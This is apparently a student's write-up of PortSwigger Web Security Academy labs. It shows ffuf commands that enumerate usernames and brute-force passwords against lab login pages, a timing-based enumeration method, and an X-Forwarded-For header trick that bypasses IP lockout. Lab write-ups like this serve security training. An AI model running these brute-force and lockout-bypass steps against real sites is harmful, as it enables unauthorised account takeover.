# Authentication

- https://portswigger.net/web-security/authentication/password-based
- https://portswigger.net/web-security/authentication/multi-factor
- https://portswigger.net/web-security/authentication/other-mechanisms

## Username enumeration via different responses

For exact examination of the differences of the requests Burp Intruder or Turbo Intruder could be used. 

But here I simply try to determine if for some username different error than 'Invalid username' is shown:

```
ffuf -u https://0ad9005104c150dd81f343a200e30077.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=XYZ' -fr 'Invalid username'
```

It reviels one username (`an`) with new error: 'Incorect password'. 

Now time to brute-force the password:

```
ffuf -u https://0ad9005104c150dd81f343a200e30077.web-security-academy.net/login -w portswigger-wordlists/passwords -d 'username=an&password=FUZZ' -fr 'Incorrect'
```

And we manage to log in. Response with correct password could be found by different response size, status or regex for error.

## Username enumeration via subtly different responses

The response status never changes and the size is random, because of analitics ids that are different in every request.

Testing with this command did not return great results:

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WongPass'
```

We might try to check if the content of the error message changes, but this time check whole html block with error, to ensure we catch even small differences.

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/usernames -d 'username=FUZZ&password=WongPass' -fr '<p class=is\-warning>Invalid username or password\.</p>'
```

Username found (`academico`). 

Testing worng and correct username responses in Burp Proxy and reviewing them in Comparer revieled that error for correct username was 'Invalid username or password', and for incorrect one was 'Invalid username or password.' (Space instead of dot)

Now time to brute-force the password:

```
ffuf -u https://0a6a00d7044d695f82c3bbbf003800c4.web-security-academy.net/login -w portswigger-wordlists/passwords -d 'username=academico&password=FUZZ' -fc 200
```

Looked for different status code than 200 - because on success usually there is a redirect 3xx response - and found a matching password.

## Username enumeration via response timing

Tested making a POST login requests using Burp Interceptor with different params.

- Correct username and correct password - results in fast 302 response
- Correct username and not correct password - results with 200 and error message
- Correct username and very long not correct password - results in 200 with long delay and same error message
- Incorrect both - results in 200 with the same error message

The app probably first check the username and only if it match it checks for the password. Applying long password makes this step significantly longer.

Additionally after multiple error trials, app prevented us for further logging in for 30 minutes. No cookie was set, and the same error occured from different browser, so it may be tied up to my IP.

Adding `X-Forwarded-For: 8.8.8.8` to the request bypassed this protection, overwriting my IP with value here provided for the app.

Run the script to find the username
```
python3 username-enumeration-script-1.py
```

The script was not perfect and could be tuned better. It consistantly retuner `mysql` user for me, so I've decided its enough to go further.

Brute force the password:
```
python3 username-enumeration-script-1-password.py
```
